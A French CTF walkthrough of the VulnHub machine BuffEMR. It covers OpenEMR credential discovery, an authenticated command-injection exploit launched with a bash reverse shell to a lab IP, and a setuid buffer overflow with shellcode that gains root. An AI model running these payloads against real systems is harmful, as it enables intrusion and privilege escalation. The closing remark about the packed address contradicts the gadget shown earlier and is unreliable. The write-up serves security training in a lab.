---
title: "Solution du CTF BuffEMR de VulnHub"
tags: [CTF, VulnHub, binary exploitation]
---

[BuffEMR](https://vulnhub.com/entry/buffemr-101,717/) était un CTF plutôt laborieux, la faute a des indices mal définis. L'escalade finale est une exploitation de binaire sans panache.

Sur le port FTP on trouve un dossier `share` avec à l'intérieur un dossier `openemr`.

## Ce mortel ennui...

Ce dossier correspond vraisemblablement à l'installation de l'appli web _OpenEMR_ présente à l'URL `/openemr` sur le serveur web.

On peut ainsi trouver sur le FTP le fichier de configuration `/share/openemr/sites/default/sqlconf.php` qui contient des identifiants :

```php
<?php
//  OpenEMR
//  MySQL Config

$host   = 'localhost';
$port   = '3306';
$login  = 'openemruser';
$pass   = 'openemruser123456';
$dbase  = 'openemr';

//Added ability to disable
//utf8 encoding - bm 05-2009
global $disable_utf8_flag;
$disable_utf8_flag = false;

$sqlconf = array();
global $sqlconf;
$sqlconf["host"]= $host;
$sqlconf["port"] = $port;
$sqlconf["login"] = $login;
$sqlconf["pass"] = $pass;
$sqlconf["dbase"] = $dbase;
//////////////////////////
//////////////////////////
//////////////////////////
//////DO NOT TOUCH THIS///
$config = 1; /////////////
//////////////////////////
//////////////////////////
//////////////////////////
?>
```

Malheureusement ces identifiants de base de données ne nous sont d'aucune utilité, le port de MySQL n'étant pas exposé. Ils ne permettent pas non plus de se connecter sur le OpenEMR.

J'ai tenté de bruteforcer le compte admin comme je l'avais fait pour le CTF [DriftingBlues #8]({% link _posts/2022-01-24-Solution-du-CTF-DriftingBlues-8-de-HackMyVM.md %}) mais sans succès.

Finalement dans cet amas de 17399 fichiers il fallait trouver le fichier `tests/test.accounts` qui contenait les infos suivantes :

```
this is a test admin account:

admin:Monster123
```

J'avoue avoir cherché une solution sur le web pour ce fichier, car il a été placé dans un dossier déjà existant de l'appli web, autant chercher une paille dans une meule de foin.

On peut alors se connecter sur l'appli. Il y a différentes sections qui permettent l'upload ou l'édition de fichier (`Administration > Files` ou encore `Misc > Doc Templates`) mais à chaque fois la tentative de placer un webshell échouait pour une histoire de permissions.

Il existe heureusement cet exploit : [OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)](https://www.exploit-db.com/exploits/45161) qui fonctionne grâce à une injection de commande dans la configuration d'_OpenEMR_.

On peut lire dans l'exploit qu'il définit le champ `form_284` qui, après lecture du HTML correspondant, correspond à la valeur du *Hylafax Server* :

```html
 <div class='row' title='Hylafax server hostname.'><div class='col-sm-5 control-label'><b>Hylafax Server</b></div><div class='col-sm-6'>
  <input type='text' class='form-control' name='form_284' id='form_284' maxlength='255' value='localhost' />
 </div></div>
```

L'exploit met aussi le champ précédent (283) à `true` pour activer cette fonctionnalité.

On utilise l'exploit comme ceci (il fait faire une petite correction du code Python préalablement à cause d'une erreur) :

```console
$ python3 openemr.py -u admin -p Monster123 -c "bash -i >& /dev/tcp/192.168.56.1/9999 0>&1" http://192.168.56.184/openemr 
 .---.  ,---.  ,---.  .-. .-.,---.          ,---.    
/ .-. ) | .-.\ | .-'  |  \| || .-'  |\    /|| .-.\   
| | |(_)| |-' )| `-.  |   | || `-.  |(\  / || `-'/   
| | | | | |--' | .-'  | |\  || .-'  (_)\/  ||   (    
\ `-' / | |    |  `--.| | |)||  `--.| \  / || |\ \   
 )---'  /(     /( __.'/(  (_)/( __.'| |\/| ||_| \)\  
(_)    (__)   (__)   (__)   (__)    '-'  '-'    (__) 
                                                       
   ={   P R O J E C T    I N S E C U R I T Y   }=    
                                                       
         Twitter : @Insecurity                       
         Site    : insecurity.sh                     

[$] Authenticating with admin:Monster123
[$] Injecting payload
```

On réceptionne alors notre shell :

```console
$ ncat -l -p 9999 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9999
Ncat: Listening on 0.0.0.0:9999
Ncat: Connection from 192.168.56.184.
Ncat: Connection from 192.168.56.184:43960.
bash: cannot set terminal process group (619): Inappropriate ioctl for device
bash: no job control in this shell
www-data@buffemr:/var/www/html/openemr/interface/main$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

En regardant les process en cours, on a la confirmation de l'injection de commande par l'exploit :

```
www-data  5880  0.0  0.0   4632    64 ?        S    05:42   0:00 sh -c faxstat -r -l -h || echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEvOTk5OSAwPiYx|base64 -d|bash
```

J'ai alors fouillé dans la base de données avec les identifiants que j'avais trouvés au départ et découvert une autre base :

```console
www-data@buffemr:/var$ mysql -u openemruser -popenemruser123456
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 606
Server version: 5.7.34-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| openemr            |
| user_info          |
+--------------------+
3 rows in set (0.00 sec)

mysql> use user_info;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+---------------------+
| Tables_in_user_info |
+---------------------+
| ENCKEYS             |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from ENCKEYS;
+------+--------+----------------------+
| id   | name   | ENC                  |
+------+--------+----------------------+
|    1 | pdfkey | c2FuM25jcnlwdDNkCg== |
+------+--------+----------------------+
1 row in set (0.01 sec)
```

À quoi sert cette clé ? Aucune idée. Elle semble se rapporter à un PDF d'après son nom, mais une recherche sur les fichiers PDF ne retourne rien d'inhabituel.

Là encore, nouvelle recherche d'ennui : il y a bien un utilisateur `buffemr` sur le système, mais ce dernier ne dispose d'aucun fichier qui nous est accessible.

Finalement, il fallait remarquer un fichier dans `/var` :

```console
www-data@buffemr:/tmp$ ls /var/
total 64K
drwxr-xr-x 15 root root     4.0K Jun 21  2021 .
drwxr-xr-x 26 root root     4.0K Jun 24  2021 ..
drwxr-xr-x  2 root root     4.0K Apr 17 21:40 backups
drwxr-xr-x 18 root root     4.0K Jun 19  2021 cache
drwxrwsrwt  2 root whoopsie 4.0K Apr 17 12:25 crash
drwxr-xr-x 68 root root     4.0K Jun 18  2021 lib
drwxrwsr-x  2 root staff    4.0K Apr 24  2018 local
lrwxrwxrwx  1 root root        9 Jun 18  2021 lock -> /run/lock
drwxrwxr-x 13 root syslog   4.0K Apr 18 00:07 log
drwxrwsr-x  2 root mail     4.0K Aug  6  2020 mail
drwxrwsrwt  2 root whoopsie 4.0K Aug  6  2020 metrics
drwxr-xr-x  2 root root     4.0K Aug  6  2020 opt
lrwxrwxrwx  1 root root        4 Jun 18  2021 run -> /run
drwxr-xr-x 10 root root     4.0K Jun 18  2021 snap
drwxr-xr-x  7 root root     4.0K Aug  6  2020 spool
drwxrwxrwt  2 root root     4.0K Apr 17 12:25 tmp
-rw-r--r--  1 root root      309 Jun 21  2021 user.zip
drwxr-xr-x  3 root root     4.0K Jun 18  2021 www
```

Indice pas logique, car il appartient à `root`.

L'archive zip est protégée par mot de passe et il fallait utiliser la `pdfkey` (qui du coup n'a aucun rapport avec un `pdf`) telle quelle et non dans sa version décodée (le base64 correspond à `san3ncrypt3d`).

On obtenait alors le fichier `user.lst` suivant :

> This file contain senstive information, therefore, should be always encrypted at rest.  
> 
> buffemr - Iamgr00t  
> 
> ****** Only I can SSH in ************



On obtenait alors notre premier flag :

```console
buffemr@buffemr:~$ cat user_flag.txt 
    .-.    ))    wWw \\\  ///      wWw \\\    ///()_()                                                                 
  c(O_O)c (o0)-. (O)_((O)(O))      (O)_((O)  (O))(O o)                                                                 
 ,'.---.`, | (_))/ __)| \ ||       / __)| \  / |  |^_\                                                                 
/ /|_|_|\ \| .-'/ (   ||\\||      / (   ||\\//||  |(_))                                                                
| \_____/ ||(  (  _)  || \ |     (  _)  || \/ ||  |  /                                                                 
'. `---' .` \)  \ \_  ||  ||      \ \_  ||    ||  )|\\                                                                 
  `-...-'   (    \__)(_/  \_)      \__)(_/    \_)(/  \)                                                                
 wWw  wWw  oo_     wWw ()_()        c  c     .-.   \\\    /// ))   ()_()     .-.   \\\    ///wW  Ww oo_     wWw  _     
 (O)  (O) /  _)-<  (O)_(O o)        (OO)   c(O_O)c ((O)  (O))(o0)-.(O o)   c(O_O)c ((O)  (O))(O)(O)/  _)-<  (O)_/||_   
 / )  ( \ \__ `.   / __)|^_\      ,'.--.) ,'.---.`, | \  / |  | (_))|^_\  ,'.---.`, | \  / |  (..) \__ `.   / __)/o_)  
/ /    \ \   `. | / (   |(_))    / //_|_\/ /|_|_|\ \||\\//||  | .-' |(_))/ /|_|_|\ \||\\//||   ||     `. | / (  / |(\  
| \____/ |   _| |(  _)  |  /     | \___  | \_____/ ||| \/ ||  |(    |  / | \_____/ ||| \/ ||  _||_    _| |(  _) | | )) 
'. `--' .`,-'   | \ \_  )|\\     '.    ) '. `---' .`||    ||   \)   )|\\ '. `---' .`||    || (_/\_),-'   | \ \_ | |//  
  `-..-' (_..--'   \__)(/  \)      `-.'    `-...-' (_/    \_)  (   (/  \)  `-...-' (_/    \_)     (_..--'   \__)\__/   



COnGRATS !! lETs get ROOT now ....!!
```

## À vaincre sans péril, on triomphe sans gloire

On pouvait ensuite accéder au dossier `/opt`. Le petit `+` lors du `ls` indique la présence d'attributs étendus :

```console
buffemr@buffemr:~$ ls -adl /opt
drwxrwx---+ 2 root root 4096 Jun 24  2021 /opt
buffemr@buffemr:~$ getfacl /opt
getfacl: Removing leading '/' from absolute path names
# file: opt
# owner: root
# group: root
user::rwx
user:buffemr:rwx
group::---
mask::rwx
other::---
```

Dans ce dossier, on trouve un binaire setuid root qui... est en 32 bits alors que le système est en 64. Le binaire a de plus une stack exécutable et n'utilise pas les canary. On va donc pouvoir sauter sur un shellcode.

```console
buffemr@buffemr:/opt$ file dontexecute 
dontexecute: setuid ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3c8287c844acebae4ece08e8c7eefc341e8972e4, not stripped
```

Il y a une fonction au nom explicite `vulnerable` qui utilise `strcpy` :

```console
$ buffemr@buffemr:/opt$ gdb -q ./dontexecute
Reading symbols from ./dontexecute...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x6dd
(gdb) r
Starting program: /opt/dontexecute 

Breakpoint 1, 0x565556dd in main ()
(gdb) disass vulnerable
Dump of assembler code for function _Z10vulnerablePc:
   0x5655569d <+0>:     push   %ebp
   0x5655569e <+1>:     mov    %esp,%ebp
   0x565556a0 <+3>:     push   %ebx
   0x565556a1 <+4>:     sub    $0x204,%esp
   0x565556a7 <+10>:    call   0x565557b0 <__x86.get_pc_thunk.ax>
   0x565556ac <+15>:    add    $0x1918,%eax
   0x565556b1 <+20>:    sub    $0x8,%esp
   0x565556b4 <+23>:    pushl  0x8(%ebp)
   0x565556b7 <+26>:    lea    -0x1fc(%ebp),%edx
   0x565556bd <+32>:    push   %edx
   0x565556be <+33>:    mov    %eax,%ebx
   0x565556c0 <+35>:    call   0x56555540 <strcpy@plt>
   0x565556c5 <+40>:    add    $0x10,%esp
   0x565556c8 <+43>:    nop
   0x565556c9 <+44>:    mov    -0x4(%ebp),%ebx
   0x565556cc <+47>:    leave  
   0x565556cd <+48>:    ret    
End of assembler dump.
(gdb) b *0x565556cd
Breakpoint 2 at 0x565556cd
(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaau
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/dontexecute aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaatzaaubaaucaaudaaueaaufaaugaauhaauiaaujaaukaaulaau

Breakpoint 1, 0x565556dd in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x565556cd in vulnerable(char*) ()
(gdb) info reg
eax            0xffffcc6c       -13204
ecx            0xffffd860       -10144
edx            0xffffd469       -11159
ebx            0x66616162       1717657954
esp            0xffffce6c       0xffffce6c
ebp            0x66616163       0x66616163
esi            0xf7e31000       -136114176
edi            0x0      0
eip            0x565556cd       0x565556cd <vulnerable(char*)+48>
eflags         0x286    [ PF SF IF ]
cs             0x23     35
ss             0x2b     43
ds             0x2b     43
es             0x2b     43
fs             0x0      0
gs             0x63     99
(gdb) x/wx $esp
0xffffce6c:     0x66616164
(gdb) x/wx $eax
0xffffcc6c:     0x61616161
(gdb) x/i 0x56556000+0x000005dc
   0x565565dc:  call   *%eax
```

Avec la chaine cyclique passée en argument, je calcule que l'adresse de retour est écrasée à l'offset 512.

Point important, `eax` pointe au moment de l'exploitation sur le début de notre buffer. On va donc utiliser un gadget (dernière ligne du dump précédent) permettant de sauter sur `eax`.

Je me suis servi de [mon shellcode favori](https://www.exploit-db.com/shellcodes/13458) signé *Marco Ivaldi*.

```console
buffemr@buffemr:/opt$ ./dontexecute `python -c 'from struct import pack; print("\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\xeb\x1d\x5e\x88\x46\x07\x89\x46\x0c\x89\x76\x08\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\x40\xcd\x80\xe8\xde\xff\xff\xff/bin/sh" + "A"*459 + pack("<I", 0x565565dc))'`
# id
uid=0(root) gid=1000(buffemr) groups=1000(buffemr),4(adm),24(cdrom),30(dip),46(plugdev),116(lpadmin),126(sambashare)
# cd /root
# ls
Root_flag.txt  snap
# cat Root_flag.txt
                                                                                                                                          
                                                                                                                                            
________                __  __                       ____                                  _____                                        ___ 
`MMMMMMMb.             69MM69MM                     6MMMMb                                69M`MM                                        `MM 
 MM    `Mb            6M' 6M' `                    8P    Y8                              6M' `MM                                         MM 
 MM     MM ___   ___ _MM__MM______  ___  __       6M      Mb ____    ___  ____  ___  __ _MM__ MM   _____  ____    _    ___  ____     ____MM 
 MM    .M9 `MM    MM MMMMMMMM6MMMMb `MM 6MM       MM      MM `MM(    )M' 6MMMMb `MM 6MM MMMMM MM  6MMMMMb `MM(   ,M.   )M' 6MMMMb   6MMMMMM 
 MMMMMMM(   MM    MM  MM  MM6M'  `Mb MM69 "       MM      MM  `Mb    d' 6M'  `Mb MM69 "  MM   MM 6M'   `Mb `Mb   dMb   d' 6M'  `Mb 6M'  `MM 
 MM    `Mb  MM    MM  MM  MMMM    MM MM'          MM      MM   YM.  ,P  MM    MM MM'     MM   MM MM     MM  YM. ,PYM. ,P  MM    MM MM    MM 
 MM     MM  MM    MM  MM  MMMMMMMMMM MM           MM      MM    MM  M   MMMMMMMM MM      MM   MM MM     MM  `Mb d'`Mb d'  MMMMMMMM MM    MM 
 MM     MM  MM    MM  MM  MMMM       MM           YM      M9    `Mbd'   MM       MM      MM   MM MM     MM   YM,P  YM,P   MM       MM    MM 
 MM    .M9  YM.   MM  MM  MMYM    d9 MM            8b    d8      YMP    YM    d9 MM      MM   MM YM.   ,M9   `MM'  `MM'   YM    d9 YM.  ,MM 
_MMMMMMM9'   YMMM9MM__MM__MM_YMMMM9 _MM_            YMMMM9        M      YMMMM9 _MM_    _MM_ _MM_ YMMMMM9     YP    YP     YMMMM9   YMMMMMM_
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
                                                                                                                                            
________                                           ___        8   8                                                                         
`MMMMMMMb.                                         `MM       (M) (M)                                                                        
 MM    `Mb                      /                   MM       (M) (M)                                                                        
 MM     MM   _____     _____   /M      ____     ____MM       (M) (M)                                                                        
 MM     MM  6MMMMMb   6MMMMMb /MMMMM  6MMMMb   6MMMMMM        M   M                                                                         
 MM    .M9 6M'   `Mb 6M'   `Mb MM    6M'  `Mb 6M'  `MM        M   M                                                                         
 MMMMMMM9' MM     MM MM     MM MM    MM    MM MM    MM        M   M                                                                         
 MM  \M\   MM     MM MM     MM MM    MMMMMMMM MM    MM        8   8                                                                         
 MM   \M\  MM     MM MM     MM MM    MM       MM    MM                                                                                      
 MM    \M\ YM.   ,M9 YM.   ,M9 YM.  ,YM    d9 YM.  ,MM       68b 68b                                                                        
_MM_    \M\_YMMMMM9   YMMMMM9   YMMM9 YMMMM9   YMMMMMM_      Y89 Y89  


COngratulations !!! Tweet me at @san3ncrypt3d !
```

La dernière adresse (passée à `struct.pack`) correspond à la chaine `/bin/sh` dabs la libc, les adresses n'étant pas randomisées.
